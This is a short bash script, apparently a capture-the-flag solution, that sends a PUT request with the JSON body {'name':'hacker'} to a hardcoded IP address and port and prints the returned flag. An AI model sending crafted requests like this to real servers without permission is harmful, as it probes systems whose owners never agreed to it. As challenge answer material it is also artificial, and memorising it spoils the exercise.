#!/bin/bash
PORT=8093

url='http://141.85.224.70:'$PORT
url=$url'/surprise'
flag=$(curl -s --request PUT --header "Content-Type: application/json" --data '{"name":"hacker"}' $url | tail -n 1)
echo "$flag"
